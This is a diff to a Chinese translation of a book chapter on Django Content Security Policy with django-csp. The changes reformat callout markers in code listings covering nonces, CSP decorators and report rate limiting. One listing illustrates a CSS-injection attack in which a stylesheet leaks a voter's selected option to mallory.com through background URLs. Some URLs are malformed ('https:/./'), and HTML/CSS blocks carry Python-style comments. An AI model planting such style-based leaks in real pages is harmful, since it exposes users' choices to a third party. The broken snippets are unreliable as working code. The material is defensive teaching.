@@ -144,12 +144,12 @@ Mallory 的样式表动态设置了 Alice 所选选项的背景。这个事件�
 ```py
 <html>
 
-    <style>                                                    ❶
-        option[value=bob]:checked {                            ❷
-            background: url(https://mallory.com/?vote=bob);    ❸
+    <style>                                                    # ❶
+        option[value=bob]:checked {                            # ❷
+            background: url(https://mallory.com/?vote=bob);    # ❸
         }
-        option[value=eve]:checked {                            ❹
-            background: url(https://mallory.com/?vote=eve);    ❺
+        option[value=eve]:checked {                            # ❹
+            background: url(https://mallory.com/?vote=eve);    # ❺
         }
     </style>
 
@@ -157,8 +157,8 @@ Mallory 的样式表动态设置了 Alice 所选选项的背景。这个事件�
         ...
         <select id="ballot">
             <option>Cast your vote!</option>
-            <option value="bob">Bob</option>                   ❻
-            <option value="eve">Eve</option>                   ❻
+            <option value="bob">Bob</option>                   # ❻
+            <option value="eve">Eve</option>                   # ❻
         </select>
         ...
     </body>
@@ -279,11 +279,11 @@ CSP_INCLUDE_NONCE_IN = ['script-src', 'style-src', ]
 在你的模板中如何获取有效的 nonce？`django-csp` 为每个请求对象添加了一个 `csp_nonce` 属性。将以下代码放入任何模板中以使用这个功能：
 
 ```py
-<script nonce='{{request.csp_nonce}}'>   ❶
+<script nonce='{{request.csp_nonce}}'>   # ❶
    /* inline script */
 </script>
 
-<style nonce='{{request.csp_nonce}}'>    ❶
+<style nonce='{{request.csp_nonce}}'>    # ❶
    body {
        font-size: 42;
    }
@@ -317,13 +317,13 @@ CSP_FRAME_ANCESTORS = ("'none'", )
 ```py
 >>> import requests
 >>> 
->>> url = 'https:/./localhost:8000/template_with_a_nonce/'    ❶
->>> response = requests.get(url, verify=False)               ❶
+>>> url = 'https:/./localhost:8000/template_with_a_nonce/'    # ❶
+>>> response = requests.get(url, verify=False)               # ❶
 >>> 
->>> header = response.headers['Content-Security-Policy']     ❷
->>> directives = header.split(';')                           ❸
->>> for directive in directives:                             ❸
-...     print(directive)                                     ❸
+>>> header = response.headers['Content-Security-Policy']     # ❷
+>>> directives = header.split(';')                           # ❸
+>>> for directive in directives:                             # ❸
+...     print(directive)                                     # ❸
 ... 
  default-src 'self'
  script-src 'self' 'nonce-Nry4fgCtYFIoHK9jWY2Uvg=='
@@ -352,13 +352,13 @@ CSP_FRAME_ANCESTORS = ("'none'", )
 ```py
 <html>
   <head>
-    <link href='https://fonts.googleapis.com/css?family=Caveat'    ❶
-          rel='stylesheet'>                                        ❶
-    <style nonce="{{request.csp_nonce}}">                          ❷
-      body {                                                       ❷
-        font-family: 'Caveat', serif;                              ❷
-      }                                                            ❷
-    </style>                                                       ❷
+    <link href='https://fonts.googleapis.com/css?family=Caveat'    # ❶
+          rel='stylesheet'>                                        # ❶
+    <style nonce="{{request.csp_nonce}}">                          # ❷
+      body {                                                       # ❷
+        font-family: 'Caveat', serif;                              # ❷
+      }                                                            # ❷
+    </style>                                                       # ❷
   </head>
     <body>
       Text displayed in Caveat font
@@ -375,11 +375,11 @@ CSP_FRAME_ANCESTORS = ("'none'", )
 ```py
 from csp.decorators import csp_update
 
-decorator = csp_update(                          ❶
- STYLE_SRC='https:/./fonts.googleapis.com',    ❶
- FONT_SRC='https:/./fonts.gstatic.com')        ❶
+decorator = csp_update(                          # ❶
+ STYLE_SRC='https:/./fonts.googleapis.com',    # ❶
+ FONT_SRC='https:/./fonts.gstatic.com')        # ❶
 
-@method_decorator(decorator, name='dispatch')    ❷
+@method_decorator(decorator, name='dispatch')    # ❷
 class CspUpdateView(View):
     def get(self, request):
         ...
@@ -395,9 +395,9 @@ class CspUpdateView(View):
 ```py
 from csp.decorators import csp_replace
 
-decorator = csp_replace(SCRIPT_SRC="'none'")     ❶
+decorator = csp_replace(SCRIPT_SRC="'none'")     # ❶
 
-@method_decorator(decorator, name='dispatch')    ❷
+@method_decorator(decorator, name='dispatch')    # ❷
 class CspReplaceView(View):
     def get(self, request):
         ...
@@ -413,7 +413,7 @@ class CspReplaceView(View):
 ```py
 from csp.decorators import csp
 
-@method_decorator(csp(DEFAULT_SRC="'self'"), name='dispatch')     ❶
+@method_decorator(csp(DEFAULT_SRC="'self'"), name='dispatch')     # ❶
 class CspView(View):
     def get(self, request):
         ...
@@ -429,7 +429,7 @@ class CspView(View):
 ```py
 from csp.decorators import csp_exempt
 
-@method_decorator(csp_exempt, name='dispatch')     ❶
+@method_decorator(csp_exempt, name='dispatch')     # ❶
 class CspExemptView(View):
     def get(self, request):
         ...
@@ -500,8 +500,8 @@ CSP_REPORT_PERCENTAGE = 0.42
 ```py
 MIDDLEWARE = [
     ...
-    # 'csp.middleware.CSPMiddleware',                        ❶
-    'csp.contrib.rate_limiting.RateLimitedCSPMiddleware',    ❷
+    # 'csp.middleware.CSPMiddleware',                        # ❶
+    'csp.contrib.rate_limiting.RateLimitedCSPMiddleware',    # ❷
     ...
 ]
 ```
